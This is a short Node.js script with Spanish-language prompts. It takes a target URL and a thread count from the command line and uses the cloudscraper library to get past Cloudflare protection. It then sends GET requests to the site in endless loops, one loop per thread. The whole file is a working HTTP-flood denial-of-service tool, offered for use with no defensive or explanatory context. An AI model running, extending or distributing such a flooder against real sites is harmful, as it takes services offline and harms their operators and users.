'use strict';
var cloudscraper = require('cloudscraper');

const args = require('minimist')(process.argv.slice(2));

var site=args['site'];
var threads=args['threads']

if(typeof site === 'undefined')
{
	console.log('Ingresa un url');
	return;
}
if (isNaN(threads))
{
	console.log('Ingresa un numero para los threads');
	return;
}

let promises = [];

function createThread() {
  return new Promise((resolve, reject) => {
    try {
      cloudscraper.get(site, function (error, response, body) {
        if (error) {
          resolve('Error');
        } else {
          resolve('Success');
        }
      });
    } catch (e) {
      resolve('Error')
    }
  });
}

async function infiniteThread() {
  try {
    await createThread();
  } catch (e) {
  }
  infiniteThread();
}

for (let index = 0; index < threads; index++) {
  infiniteThread();
}
